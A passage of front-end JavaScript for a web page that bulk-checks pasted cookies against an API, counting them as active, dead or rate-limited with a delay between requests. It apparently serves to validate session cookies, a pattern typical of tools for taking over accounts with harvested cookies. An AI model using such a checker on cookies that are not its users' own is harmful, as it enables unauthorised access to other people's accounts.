                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie: cookieToTest })
            });

            const rawResponseText = await response.text();
            let data = JSON.parse(rawResponseText);
            
            const resultHtml = createResultElement(data, response.status, 'single', 1);
            $('#singleResultsList').html(resultHtml);
            
            // Automatically clear the input box after checking
            $('#singleInput').val('');

        } catch (error) {
            $('#singleResultsList').html(`
                <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">
                    <span class="status-badge status-error mr-3">SYSTEM ERROR</span>
                    <span style="color: var(--text-muted); font-size: 13px;">Failed to connect to API.</span>
                </div>
            `);
        } finally {
            btn.prop('disabled', false).html(originalHtml);
        }
    }

    // --- Bulk Check Execution ---
    async function processBulk() {
        const rawText = $('#bulkInput').val().trim();
        if (!rawText) return alert("Please paste some cookies first!");

        const cookies = parseMixedInput(rawText);
        if (cookies.length === 0) return alert("No valid cookies found to process.");

        const btn = $('#startBulkBtn');
        btn.prop('disabled', true).html('<div class="loader"></div> PROCESSING BULK...');
        
        // Setup UI for Bulk Check - explicitly restore d-flex classes
        $('#resultsCard').show();
        $('#resultsHeader').addClass('d-flex').show(); 
        $('#bulkStats').addClass('d-flex').show(); 
        
        $('#singleResultsList').hide();
        $('#bulkResultsList').empty();

        // Initialize Stats & Carousel Reset
        currentActiveIndex = 0;
        totalActiveCards = 0;
        updateCarouselUI();
        
        let deadCount = 0;
        let limitCount = 0;
        
        $('#statActive').text(totalActiveCards);
        $('#statDead').text(deadCount);
        $('#statLimit').text(limitCount);

        // Unified Loading Animation Text
        $('#progressText').html(`<div class="loader" style="width:14px; height:14px; border-width:2px; border-top-color: #f43f5e;"></div> <span style="color:#f8fafc; font-weight: 600;">Processing...</span>`);

        for (let i = 0; i < cookies.length; i++) {
            
            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie: cookies[i] })
                });

                const rawResponseText = await response.text();
                let data = JSON.parse(rawResponseText);
                
                // Track Stats
                if (data.status === 'SUCCESS') {
                    totalActiveCards++;
                    $('#statActive').text(totalActiveCards);
                    
                    // Add Card to Carousel
                    let isActiveClass = (totalActiveCards === 1) ? 'active' : '';
                    let resultHtml = createResultElement(data, response.status, 'bulk', totalActiveCards);
                    
                    $('#bulkResultsList').append(`<div class="carousel-card ${isActiveClass}">${resultHtml}</div>`);
                    updateCarouselUI();
                    
                } else if (data.status === 'ERROR' && response.status === 429) {
                    limitCount++;
                    $('#statLimit').text(limitCount);
                } else {
                    deadCount++;
                    $('#statDead').text(deadCount);
                }

            } catch (error) {
                // Network or parse errors count as dead/failed
                deadCount++;
                $('#statDead').text(deadCount);
            }

            if (i < cookies.length - 1) {
                await sleep(2000); 
            }
        }

        $('#progressText').html(`<i class="fas fa-check-circle text-[#34d399] mr-1"></i> Finished! Processed ${cookies.length} total.`);
        btn.prop('disabled', false).html('<i class="fas fa-layer-group mr-2"></i> START BULK CHECK');
        
        // Automatically clear the input box after checking all bulk cookies
        $('#bulkInput').val('');
    }
</script>

</body>
</html>